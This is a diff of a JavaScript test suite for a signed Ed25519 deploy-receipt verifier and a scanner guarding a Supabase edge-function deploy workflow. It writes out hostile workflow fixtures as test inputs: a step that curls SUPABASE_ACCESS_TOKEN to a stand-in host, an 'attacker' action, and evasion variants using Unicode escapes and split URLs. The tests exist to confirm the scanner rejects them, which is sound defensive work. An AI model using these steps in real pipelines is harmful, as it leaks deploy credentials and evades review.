+      '    "if": true\n    needs: admission',
+    ),
+  ],
+  [
+    "deploy workflow fresh-job repo execution",
+    ".github/workflows/deploy-edge-function.yml",
+    deployWorkflowSource.replace(
+      "      - name: Verify function source exists in fresh deploy job",
+      "      - name: Persist an unsafe hook\n        run: node scripts/verify-dashboard-deploy-receipt.mjs\n      - name: Verify function source exists in fresh deploy job",
+    ),
+  ],
+  [
+    "deploy workflow fresh-job remote action",
+    ".github/workflows/deploy-edge-function.yml",
+    deployWorkflowSource.replace(
+      "      - name: Verify function source exists in fresh deploy job",
+      `      - uses: attacker/path-hook@${"a".repeat(40)}\n      - name: Verify function source exists in fresh deploy job`,
+    ),
+  ],
+  [
+    "deploy workflow post-deploy credential step",
+    ".github/workflows/deploy-edge-function.yml",
+    `${deployWorkflowSource}      - name: Leak after deploy\n        env:\n          SUPABASE_ACCESS_TOKEN: \${{ secrets.SUPABASE_ACCESS_TOKEN }}\n        run: curl --data \"$SUPABASE_ACCESS_TOKEN\" https://example.invalid\n`,
+  ],
+  [
+    "compliance workflow mutable action",
+    ".github/workflows/compliance-gate.yml",
+    complianceSource.replace(
+      "actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020",
+      "actions/setup-node@v4",
+    ),
+  ],
+  [
+    "compliance workflow quoted continue",
+    ".github/workflows/compliance-gate.yml",
+    complianceSource.replace(
+      "    runs-on: ubuntu-latest",
+      '    "continue-on-error": true\n    runs-on: ubuntu-latest',
+    ),
+  ],
+]) {
+  assert.notEqual(
+    substantiveViolationsWithLocallyRefreshedDigest(relative, source).length,
+    0,
+    `${label} passed semantically after its manifest digest was locally refreshed`,
+  );
+}
+
+const supabaseAccessTokenName = ["SUPABASE", "ACCESS", "TOKEN"].join("_");
+for (const [label, source] of [
+  ["environment binding", "jobs:\n  deploy:\n    environment:\n      name: Production"],
+  ["quoted environment binding", 'jobs:\n  deploy:\n    "environment": Production'],
+  [
+    "explicit multiline escaped environment key",
+    'jobs:\n  deploy:\n    ? "environ\\\n        ment"\n    : Production\n    runs-on: ubuntu-latest',
+  ],
+  [
+    "YAML merge-key environment binding",
+    "defaults: &production\n  environment: Production\njobs:\n  deploy:\n    <<: *production",
+  ],
+  [
+    "management token",
+    "jobs:\n  deploy:\n    env:\n      TOKEN: ${{ secrets." +
+      supabaseAccessTokenName + " }}",
+  ],
+  ["setup CLI", "jobs:\n  deploy:\n    steps:\n      - uses: supabase/setup-cli@0123456789012345678901234567890123456789"],
+  ["quoted setup CLI", 'jobs:\n  deploy:\n    steps:\n      - "uses": supabase/setup-cli@0123456789012345678901234567890123456789'],
+  [
+    "eight-digit YAML Unicode escapes",
+    "jobs:\n  deploy:\n    \"\\U00000065nvironment\": Production\n    env:\n      TOKEN: \"\\U00000024{{ secrets.S\\U00000055PABASE_ACCESS_TOKEN }}\"\n    steps:\n      - \"\\U00000075ses\": \"s\\U00000075pabase/setup-cli@v1\"\n      - run: \"s\\U00000075pabase f\\U00000075nctions d\\U00000065ploy h\\U00000061ndle-lead --project-ref x\"",
+  ],
+  ["management API", "jobs:\n  deploy:\n    steps:\n      - run: curl https://api.supabase.com/v1/projects/project/functions"],
+  ["split management API", 'jobs:\n  deploy:\n    steps:\n      - run: A=https://api.; B=supabase.com; curl "$A$B/v1/projects/project/functions"'],
+  ["variable CLI deploy", 'jobs:\n  deploy:\n    steps:\n      - run: A=supa; B=base; "$A$B" functions deploy handle-lead --project-ref project'],
+  ["Docker CLI deploy", "jobs:\n  deploy:\n    steps:\n      - run: docker run supabase/cli:2.113.0 functions deploy lead-crm --project-ref project"],
+  ["script deploy", "jobs:\n  deploy:\n    steps:\n      - run: bash scripts/production-supabase-deploy.sh"],
+]) {
+  assert.notEqual(
+    workflowPrivilegeViolations(".github/workflows/rogue.yml", source).length,
+    0,
+    `${label} escaped the workflow privilege boundary`,
+  );
+}
+
+const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "ut-client-ip-v3-hardening-"));
 try {
   const raw = buildRawArtifacts(tempRoot);
+  activeFinalStatePaths = raw.finalStatePaths;
   const verifyCaptured = spawnSync(
     process.execPath,
     [
@@ -683,8 +1237,10 @@ try {
   write0600(capturedWrapper, originalWrapper);
 
   const issued = issue(raw);
-  validPayload = structuredClone(issued.payload);
-  assert.equal(issued.payload.receipt_version, 2);
+  assert.equal(issued.payload.receipt_version, 3);
+  assert.equal(issued.payload.receipt_signature_scheme, "ed25519");
+  assert.equal(issued.payload.target_function, "handle-lead");
+  assert.equal(issued.payload.dispatch_nonce, DISPATCH_NONCE);
   assert.equal(issued.payload.probe_function.status, "ACTIVE");
   assert.equal(
     issued.payload.source_binding.artifact_provenance_scope,
@@ -712,12 +1268,88 @@ try {
   assert.equal(JSON.stringify(issued.payload).includes(IPV6_FINGERPRINT), false);
   assert.deepEqual(verifyPayload(issued.payload), {
     required: true,
+    targetFunction: "handle-lead",
+    dispatchNonce: DISPATCH_NONCE,
     extractorSha256: artifacts.extractorSha256,
     probeId: PROBE_ID,
     probeVersion: PROBE_VERSION,
     sourceManifestSha256: artifacts.sourceManifestSha256,
     operatorCapturedEzbrSha256: EZBR_SHA256,
   });
+  assert.throws(
+    () => verifyPayload(issued.payload, NOW, { functionName: "lead-crm" }),
+    /not bound to this protected function/,
+  );
+  assert.throws(
+    () => verifyPayload(issued.payload, NOW, {
+      dispatchNonce: "different-dispatch-nonce-fixture-0000001",
+    }),
+    /dispatch nonce/,
+  );
+  assert.throws(
+    () => verifyPayload(issued.payload, NOW, {
+      publicKeySpkiDerBase64: OTHER_PUBLIC_KEY_SPKI_DER_BASE64,
+    }),
+    /signature is invalid/,
+  );
+  assert.throws(
+    () => verifyPayload(issued.payload, NOW, {
+      publicKeySpkiDerBase64: TRAILING_PUBLIC_KEY_SPKI_DER_BASE64,
+    }),
+    /canonical public-key DER|public key is invalid/,
+  );
+  assert.throws(
+    () => signClientIpDeployReceipt(
+      issued.payload,
+      TRAILING_PRIVATE_KEY_PKCS8_DER_BASE64,
+    ),
+    /canonical private-key DER|private key is invalid/,
+  );
+
+  withJsonMutation(raw.files.finalFunctions, (value) => {
+    value[0].version += 1;
+  }, () => assert.throws(() => verifyPayload(issued.payload), /final live.*differs/));
+  withJsonMutation(raw.files.finalFunctions, (value) => {
+    value.push({
+      slug: "client-ip-probe",
+      id: PROBE_ID,
+      version: PROBE_VERSION,
+      status: "ACTIVE",
+      verify_jwt: false,
+    });
+  }, () => assert.throws(() => verifyPayload(issued.payload), /probe remains present/));
+  withJsonMutation(raw.files.finalSecrets, (value) => {
+    value[0].value = "9".repeat(64);
+  }, () => assert.throws(() => verifyPayload(issued.payload), /final live.*differs/));
+  for (const finalPath of [raw.files.finalFunctions, raw.files.finalSecrets]) {
+    mutateRawFile(finalPath, (text) => {
+      const objectAt = text.indexOf("{");
+      return `${text.slice(0, objectAt + 1)}"duplicate_fixture":1,"duplicate_fixture":2,${text.slice(objectAt + 1)}`;
+    }, () => assert.throws(
+      () => verifyPayload(issued.payload),
+      /duplicate object keys/,
+    ));
+  }
+
+  const duplicatePayloadText = JSON.stringify(issued.payload).replace(
+    `"project_ref":"${PROJECT_REF}"`,
+    `"project_ref":"${PROJECT_REF}","project_ref":"attackerprojectref"`,
+  );
+  assert.throws(
+    () => verifyClientIpDeployReceipt({
+      functionName: "handle-lead",
+      dispatchNonce: DISPATCH_NONCE,
+      deploySha: SHA,
+      projectRef: PROJECT_REF,
+      extractorSource,
+      probeTemplateSource,
+      receiptToken: signRawPayloadText(duplicatePayloadText),
+      publicKeySpkiDerBase64: PUBLIC_KEY_SPKI_DER_BASE64,
+      ...raw.finalStatePaths,
+      now: NOW,
+    }),
+    /duplicate object keys/,
+  );
 
   const receiptMutations = [
     ["CI self-protection overclaim", (p) => p.ci_trust_boundary.authorized_maintainer_ci_mutation_self_protected = true, /trust boundary/],
@@ -730,6 +1362,10 @@ try {
     ["case target", (p) => p.requests.matrix.ipv4.forged_x_forwarded_for.target_source_sha = OTHER_SHA, /family\/runtime binding/],
     ["fingerprint smuggling", (p) => p.requests.matrix.ipv4.baseline.fingerprint = IPV4_FINGERPRINT, /schema differs/],
     ["metadata restoration", (p) => p.metadata_integrity.secrets_canary_sha256 = "d".repeat(64), /metadata restoration/],
+    ["future effective lifetime", (p) => {
+      p.issued_at = new Date(NOW.getTime() + 4 * 60 * 1000).toISOString();
+      p.expires_at = new Date(NOW.getTime() + 19 * 60 * 1000).toISOString();
+    }, /stale or future-dated/],
     ["compute not restored", (p) => p.metadata_integrity.compute_post_sha256 = "d".repeat(64), /metadata restoration/],
     ["atomic delete overclaim", (p) => p.mutation_control.deletion_atomicity = "atomic", /non-atomic/],
     ["negative body weak", (p) => p.requests.negative_auth.missing_signature.exact_body = false, /exact generic 401/],
@@ -777,6 +1413,10 @@ try {
   withJsonMutation(raw.files.secretsCanary, (value) => {
     value.secrets[0].value = "plaintext-secret";
   }, () => assert.throws(() => issue(raw), /provider digest/));
+  mutateRawFile(raw.files.secretsCanary, (text) => text.replace(
+    `"value":"${"3".repeat(64)}"`,
+    `"value":"${"3".repeat(64)}","value":"plaintext-secret"`,
+  ), () => assert.throws(() => issue(raw), /duplicate object keys/));
   withJsonMutation(raw.files.secretsCanary, (value) => {
     value.secrets.push({ ...value.secrets[0] });
   }, () => assert.throws(() => issue(raw), /duplicate secret name/));
@@ -831,6 +1471,11 @@ try {
   withJsonMutation(raw.requestPaths["ipv4-baseline"].response_path, (value) => {
     value.extra = "raw-debug";
   }, () => assert.throws(() => issue(raw), /HTTP 200 response schema differs/));
+  mutateRawFile(
+    raw.requestPaths["ipv4-baseline"].response_path,
+    (text) => text.replace('"ok":true', '"ok":true,"ok":false'),
+    () => assert.throws(() => issue(raw), /duplicate object keys/),
+  );
   withJsonMutation(raw.requestPaths["ipv6-baseline"].response_path, (value) => {
     value.observed_family = "ipv4";
   }, () => assert.throws(() => issue(raw), /target\/runtime\/family binding/));
@@ -871,9 +1516,37 @@ try {
   }, () => assert.throws(() => issue(raw), /mode-0600/));
   fs.unlinkSync(statusHardlink);
 
-  const cliEnv = {
+  const rawJsonArtifactPaths = [
+    ...Object.entries(raw.files)
+      .filter(([name, filePath]) =>
+        !["ezbrCanary", "ezbrRecheck", "finalFunctions", "finalSecrets"].includes(name) &&
+        filePath.endsWith(".json")
+      )
+      .map(([, filePath]) => filePath),
+    ...Object.entries(raw.requestPaths).flatMap(([caseId, paths]) => [
+      paths.request_path,
+      paths.status_path,
+      ...(caseId.startsWith("ipv4-") || caseId.startsWith("ipv6-")
+        ? [paths.response_path]
+        : []),
+    ]),
+  ];
+  for (const filePath of [...new Set(rawJsonArtifactPaths)]) {
+    mutateRawFile(filePath, (text) => {
+      const objectAt = text.indexOf("{");
+      assert.notEqual(objectAt, -1, `${filePath} must contain a JSON object`);
+      return `${text.slice(0, objectAt + 1)}"duplicate_fixture":1,"duplicate_fixture":2,${text.slice(objectAt + 1)}`;
+    }, () => assert.throws(
+      () => issue(raw),
+      /duplicate object keys/,
+      `${filePath} did not reject duplicate JSON keys`,
+    ));
+  }
+
+  const issuerEnv = {
     PATH: process.env.PATH,
     FUNCTION_NAME: "handle-lead",
+    CLIENT_IP_DEPLOY_DISPATCH_NONCE: DISPATCH_NONCE,
     DEPLOY_SHA: SHA,
     SUPABASE_PROJECT_REF: PROJECT_REF,
     CLIENT_IP_FUNCTIONS_PRE_PATH: raw.files.functionsPre,
@@ -893,69 +1566,138 @@ try {
     CLIENT_IP_CAPTURED_SOURCE_ROOT: raw.capturedSourceRoot,
     CLIENT_IP_REQUEST_ARTIFACT_MANIFEST_PATH: raw.files.requestManifest,
     CLIENT_IP_OPERATOR_ATTESTATION_PATH: raw.files.operatorAttestation,
-    CLIENT_IP_DEPLOY_RECEIPT_HMAC_KEY: HMAC_KEY,
+    CLIENT_IP_DEPLOY_RECEIPT_PRIVATE_KEY_PKCS8_DER_BASE64:
+      PRIVATE_KEY_PKCS8_DER_BASE64,
   };
   const tokenPath = path.join(tempRoot, "receipt.token");
   const issueCli = spawnSync(
     process.execPath,
-    ["scripts/verify-client-ip-deploy-receipt.mjs", "--issue", tokenPath],
-    { cwd: root, env: cliEnv, encoding: "utf8" },
+    ["scripts/issue-client-ip-deploy-receipt.mjs", tokenPath],
+    { cwd: root, env: issuerEnv, encoding: "utf8" },
   );
   assert.equal(issueCli.status, 0, issueCli.stderr);
   const cliToken = fs.readFileSync(tokenPath, "utf8").trim();
   assert.match(cliToken, /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/);
   assert.equal(fs.statSync(tokenPath).mode & 0o777, 0o600);
   assert.equal(issueCli.stdout.includes(cliToken), false);
+  assert.equal(issueCli.stdout.includes(PRIVATE_KEY_PKCS8_DER_BASE64), false);
+  const verifierEnv = {
+    PATH: process.env.PATH,
+    FUNCTION_NAME: "handle-lead",
+    CLIENT_IP_DEPLOY_DISPATCH_NONCE: DISPATCH_NONCE,
+    DEPLOY_SHA: SHA,
+    SUPABASE_PROJECT_REF: PROJECT_REF,
+    CLIENT_IP_DEPLOY_RECEIPT_TOKEN: cliToken,
+    CLIENT_IP_DEPLOY_RECEIPT_PUBLIC_KEY_SPKI_DER_BASE64:
+      PUBLIC_KEY_SPKI_DER_BASE64,
+    CLIENT_IP_FINAL_FUNCTIONS_PATH: raw.files.finalFunctions,
+    CLIENT_IP_FINAL_SECRETS_PATH: raw.files.finalSecrets,
+  };
+  assert.equal(
+    Object.hasOwn(
+      verifierEnv,
+      "CLIENT_IP_DEPLOY_RECEIPT_PRIVATE_KEY_PKCS8_DER_BASE64",
+    ),
+    false,
+  );
   const verifyCli = spawnSync(
     process.execPath,
     ["scripts/verify-client-ip-deploy-receipt.mjs"],
     {
       cwd: root,
-      env: { ...cliEnv, CLIENT_IP_DEPLOY_RECEIPT_TOKEN: cliToken },
+      env: verifierEnv,
       encoding: "utf8",
     },
   );
   assert.equal(verifyCli.status, 0, verifyCli.stderr);
+  assert.equal(verifyCli.stdout.includes(cliToken), false);
+  assert.equal(verifyCli.stdout.includes(PUBLIC_KEY_SPKI_DER_BASE64), false);
   const overwriteCli = spawnSync(
     process.execPath,
-    ["scripts/verify-client-ip-deploy-receipt.mjs", "--issue", tokenPath],
-    { cwd: root, env: cliEnv, encoding: "utf8" },
+    ["scripts/issue-client-ip-deploy-receipt.mjs", tokenPath],
+    { cwd: root, env: issuerEnv, encoding: "utf8" },
   );
   assert.notEqual(overwriteCli.status, 0);
+  const missingPrivateKeyCli = spawnSync(
+    process.execPath,
+    ["scripts/issue-client-ip-deploy-receipt.mjs", path.join(tempRoot, "no-key.token")],
+    {
+      cwd: root,
+      env: {
+        ...issuerEnv,
+        CLIENT_IP_DEPLOY_RECEIPT_PRIVATE_KEY_PKCS8_DER_BASE64: "",
+      },
+      encoding: "utf8",
+    },
+  );
+  assert.notEqual(missingPrivateKeyCli.status, 0);
+
+  const verifierIssueMode = spawnSync(
+    process.execPath,
+    ["scripts/verify-client-ip-deploy-receipt.mjs", "--issue", tokenPath],
+    { cwd: root, env: verifierEnv, encoding: "utf8" },
+  );
+  assert.notEqual(verifierIssueMode.status, 0);
+
+  const invalidSignature = `${cliToken.slice(0, -1)}${
+    cliToken.endsWith("A") ? "B" : "A"
+  }`;
+  const stalePayload = structuredClone(issued.payload);
+  stalePayload.issued_at = new Date(NOW.getTime() - 20 * 60 * 1000).toISOString();
+  stalePayload.expires_at = new Date(NOW.getTime() - 5 * 60 * 1000).toISOString();
+  const cliFailures = [
+    ["missing token", { CLIENT_IP_DEPLOY_RECEIPT_TOKEN: "" }],
+    ["missing public key", {
+      CLIENT_IP_DEPLOY_RECEIPT_PUBLIC_KEY_SPKI_DER_BASE64: "",
+    }],
+    ["invalid signature", { CLIENT_IP_DEPLOY_RECEIPT_TOKEN: invalidSignature }],
+    ["stale", {
+      CLIENT_IP_DEPLOY_RECEIPT_TOKEN: signClientIpDeployReceipt(
+        stalePayload,
+        PRIVATE_KEY_PKCS8_DER_BASE64,
+      ),
+    }],
+    ["wrong SHA", { DEPLOY_SHA: OTHER_SHA }],
+    ["wrong project", { SUPABASE_PROJECT_REF: "attackerprojectref" }],
+    ["wrong protected function", { FUNCTION_NAME: "lead-crm" }],
+    ["wrong nonce", {
+      CLIENT_IP_DEPLOY_DISPATCH_NONCE:
+        "different-dispatch-nonce-fixture-0000001",
+    }],
+  ];
+  for (const [label, envPatch] of cliFailures) {
+    const failed = spawnSync(
+      process.execPath,
+      ["scripts/verify-client-ip-deploy-receipt.mjs"],
+      { cwd: root, env: { ...verifierEnv, ...envPatch }, encoding: "utf8" },
+    );
+    assert.notEqual(failed.status, 0, `${label} verifier CLI case passed`);
+  }
 } finally {
   fs.rmSync(tempRoot, { recursive: true, force: true });
 }
 
-assert.equal(
-  verifyClientIpDeployReceipt({
-    functionName: "lead-crm",
-    deploySha: SHA,
-    projectRef: PROJECT_REF,
-    extractorSource,
-    probeTemplateSource,
-    receiptToken: signClientIpDeployReceipt(validPayload, HMAC_KEY),
-    receiptHmacKey: HMAC_KEY,
-    now: NOW,
-  }).required,
-  true,
-);
 assert.deepEqual(
   verifyClientIpDeployReceipt({ functionName: "weekly-report" }),
   { required: false },
 );
 
-const signed = signClientIpDeployReceipt({ test: true }, HMAC_KEY);
+const signed = signClientIpDeployReceipt(
+  { test: true },
+  PRIVATE_KEY_PKCS8_DER_BASE64,
+);
 const [encoded, signature] = signed.split(".");
 const tampered = `${encoded}.${signature.startsWith("A") ? "B" : "A"}${signature.slice(1)}`;
 assert.throws(
   () => verifyClientIpDeployReceipt({
     functionName: "handle-lead",
+    dispatchNonce: DISPATCH_NONCE,
     deploySha: SHA,
     projectRef: PROJECT_REF,
     extractorSource,
     probeTemplateSource,
     receiptToken: tampered,
-    receiptHmacKey: HMAC_KEY,
+    publicKeySpkiDerBase64: PUBLIC_KEY_SPKI_DER_BASE64,
     now: NOW,
   }),
   /signature is invalid/,
@@ -963,21 +1705,106 @@ assert.throws(
 
 const workflow = parseWorkflow(".github/workflows/deploy-edge-function.yml");
 const deployJob = workflow.jobs.deploy;
+const admissionJob = workflow.jobs.admission;
+assert.equal(deployJob.needs, "admission");
 assert.equal(deployJob.if, undefined);
 assert.equal(deployJob["continue-on-error"], undefined);
+assert.equal(admissionJob.if, undefined);
+assert.equal(admissionJob["continue-on-error"], undefined);
 const deploySteps = deployJob.steps;
 for (const step of deploySteps) {
   assert.equal(step.if, undefined, `${step.name ?? step.uses} must not be conditional`);
   assert.equal(step["continue-on-error"], undefined, `${step.name ?? step.uses} must fail closed`);
 }
-const receiptAt = deploySteps.findIndex((step) =>
-  step.name === "Enforce fresh signed final-extractor client-IP canary receipt"
-);
 const deployAt = deploySteps.findIndex((step) => step.name?.startsWith("Deploy "));
-assert(receiptAt > 0 && deployAt > receiptAt);
-assert.equal(
-  deploySteps[receiptAt].run.trim(),
+assert(deployAt > 0);
+const deployStep = deploySteps[deployAt];
+const deployRun = deployStep.run;
+const verifierAt = deployRun.indexOf(
   "node scripts/verify-client-ip-deploy-receipt.mjs",
+);
+const commandAt = deployRun.indexOf('supabase functions deploy "${{ inputs.function }}"');
+assert(verifierAt > 0 && commandAt > verifierAt);
+assert(
+  deployRun.indexOf("supabase functions list", 0) < verifierAt &&
+    deployRun.indexOf("supabase secrets list", 0) < verifierAt,
+);
+assert.equal(
+  deployRun.match(/node scripts\/audit-client-ip-probe-contract\.mjs/g)?.length,
+  1,
+);
+assert.equal(
+  deployRun.match(/git status --porcelain=v1 --untracked-files=all/g)?.length,
+  2,
+);
+const scannerAt = deployRun.indexOf(
+  "node scripts/audit-client-ip-probe-contract.mjs",
+);
+const finalStatusAt = deployRun.lastIndexOf(
+  "git status --porcelain=v1 --untracked-files=all",
+);
+const liveMainAt = deployRun.indexOf("LIVE_MAIN_SHA=");
+const liveCaptureAt = deployRun.indexOf("supabase functions list");
+assert(
+  scannerAt > 0 && finalStatusAt > scannerAt && liveMainAt > finalStatusAt &&
+    liveCaptureAt > liveMainAt && verifierAt > liveCaptureAt &&
+    commandAt > verifierAt,
+  "fresh deploy must order scanner, post-scanner integrity, main, live capture, verifier, deploy",
+);
+assert.match(
+  deployRun,
+  /env -i PATH="\$PATH" HOME="\$HOME" \\\n\s+node scripts\/audit-client-ip-probe-contract\.mjs/,
+);
+const verifierEnvStart = deployRun.lastIndexOf("\nenv -i", verifierAt) + 1;
+assert(verifierEnvStart > 0);
+const verifierInvocation = deployRun.slice(verifierEnvStart, verifierAt);
+assert.equal(verifierInvocation.includes("GH_TOKEN"), false);
+assert.equal(verifierInvocation.includes("SUPABASE_ACCESS_TOKEN"), false);
+assert.match(
+  deployRun,
+  /unset[\s\S]*SUPABASE_ACCESS_TOKEN[\s\S]*GH_TOKEN[\s\S]*CLIENT_IP_DEPLOY_RECEIPT_TOKEN/,
+);
+assert.equal(
+  deployRun.slice(
+    verifierAt + "node scripts/verify-client-ip-deploy-receipt.mjs".length,
+    commandAt,
+  ).trim(),
+  'SUPABASE_ACCESS_TOKEN="$SUPABASE_TOKEN_VALUE" \\',
+  "only the deploy command's scoped management credential may follow the verifier",
+);
+for (const step of deploySteps.slice(0, deployAt)) {
+  assert.equal(
+    /(?:node|deno|python\d*|ruby|bash|sh)\s+(?:\.\/)?scripts\//i.test(
+      step.run ?? "",
+    ),
+    false,
+    `${step.name ?? step.uses} executes repository code before the fresh deploy gate`,
+  );
+}
+assert.equal(
+  deployStep.env.CLIENT_IP_DEPLOY_DISPATCH_NONCE,
+  "${{ inputs.receipt_nonce }}",
+);
+assert.equal(
+  deployStep.env.CLIENT_IP_DEPLOY_RECEIPT_PUBLIC_KEY_SPKI_DER_BASE64,
+  "${{ vars.CLIENT_IP_DEPLOY_RECEIPT_PUBLIC_KEY_SPKI_DER_BASE64 }}",
+);
+assert.equal(
+  JSON.stringify(workflow).includes(
+    "CLIENT_IP_DEPLOY_RECEIPT_PRIVATE_KEY_PKCS8_DER_BASE64",
+  ),
+  false,
+);
+assert.equal(
+  deploySteps[0].uses,
+  "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
+);
+assert(
+  deploySteps.some((step) =>
+    step.uses ===
+      "supabase/setup-cli@ab058987d8d6c725971f6cf9d0b5c98467e30bd1" &&
+    step.with?.version === "2.113.0"
+  ),
 );
 
 const compliance = parseWorkflow(".github/workflows/compliance-gate.yml");
@@ -999,16 +1826,44 @@ assert(
     step.run?.trim() === "node scripts/test-client-ip-deploy-receipt.mjs"
   ),
 );
+const immutableAction = /^[^@]+@[0-9a-f]{40}$/;
+for (const job of Object.values(compliance.jobs)) {
+  for (const step of job.steps ?? []) {
+    if (step.uses) {
+      assert.match(step.uses, immutableAction, `${step.uses} is not immutable`);
+    }
+  }
+}
 
-const trustedManifest = JSON.parse(
-  read("scripts/client-ip-probe-audit-trusted.json"),
-).files;
 const tracked = new Map();
-const listed = spawnSync("git", ["ls-files", "-z"], { cwd: root, encoding: "utf8" });
+const listed = spawnSync("git", ["ls-files", "-s", "-z"], {
+  cwd: root,
+  encoding: "utf8",
+});
 assert.equal(listed.status, 0, listed.stderr);
-for (const relative of listed.stdout.split("\0").filter(Boolean)) {
+for (const record of listed.stdout.split("\0").filter(Boolean)) {
+  const match = record.match(/^(\d{6}) [0-9a-f]+ \d\t([\s\S]+)$/);
+  assert(match, `invalid git index record: ${record}`);
+  const [, fileMode, relative] = match;
   const contents = fs.readFileSync(path.join(root, relative));
-  tracked.set(relative, contents.includes(0) ? null : contents.toString("utf8"));
+  let source = null;
+  if (!contents.includes(0)) {
+    try {
+      const decoded = new TextDecoder("utf-8", {
+        fatal: true,
+        ignoreBOM: true,
+      }).decode(contents);
+      if (Buffer.from(decoded, "utf8").equals(contents)) source = decoded;
+    } catch {
+      source = null;
+    }
+  }
+  tracked.set(relative, {
+    source,
+    fileMode,
+    fileDigest: crypto.createHash("sha256").update(contents).digest("hex"),
+    fileHeaderHex: contents.subarray(0, 64).toString("hex"),
+  });
 }
 assert.deepEqual(
   auditClientIpProbeContract({
@@ -1025,22 +1880,18 @@ const scannerCli = spawnSync(
 );
 assert.equal(scannerCli.status, 0, scannerCli.stderr);
 for (const [relative, expectedDigest] of Object.entries(trustedManifest)) {
-  const source = tracked.get(relative);
+  const source = tracked.get(relative)?.source;
   assert.equal(typeof source, "string");
   assert.equal(
     crypto.createHash("sha256").update(source).digest("hex"),
     expectedDigest,
   );
-  const tamperedSources = new Map([[
-    relative,
-    `${source}\n["client","ip","probe"].join("-"); Deno.connect({hostname:"x",port:1}); supabase functions deploy handle-lead`,
-  ]]);
   assert.notEqual(
-    auditClientIpProbeContract({
-      trackedSources: tamperedSources,
-      templateSource: probeTemplateSource,
-      trustedDigests: trustedManifest,
-    }).length,
+    probeToolViolations(
+      relative,
+      `${source}\n["client","ip","probe"].join("-"); Deno.connect({hostname:"x",port:1}); supabase functions deploy handle-lead`,
+      { trustedDigests: trustedManifest, fileMode: "100644" },
+    ).length,
     0,
     `${relative} trusted digest did not fail closed after mutation`,
   );
@@ -1062,6 +1913,15 @@ for (const text of [
   "8 authenticated",
   "2 negative-auth",
   "literal-slug-only",
+  "Ed25519",
+  "PKCS8 DER-base64",
+  "SPKI DER-base64",
+  "CLIENT_IP_DEPLOY_DISPATCH_NONCE",
+  "CLIENT_IP_FINAL_FUNCTIONS_PATH",
+  "CLIENT_IP_FINAL_SECRETS_PATH",
+  "15 minutes",
+  "single-use",
+  "offline generated fixture keys",
 ]) {
   assert(runbook.includes(text), `client-IP runbook omits ${text}`);
 }
@@ -1074,5 +1934,5 @@ for (const overclaim of [
 }
 
 console.log(
-  "Client-IP receipt v2 passed: artifact-derived ACTIVE tuple/source/request/metadata/compute evidence, exact dual-stack runtime binding, repo-wide anti-bypass scanner, and explicit signer-scoped provenance.",
+  "Client-IP receipt v3 offline fixtures passed: Ed25519 function/nonce binding, artifact-derived ACTIVE tuple/source/request/final-live metadata/compute evidence, exact dual-stack runtime binding, repo-wide structural anti-bypass scanner, and explicit signer-scoped provenance. This is not live deployment proof.",
 );
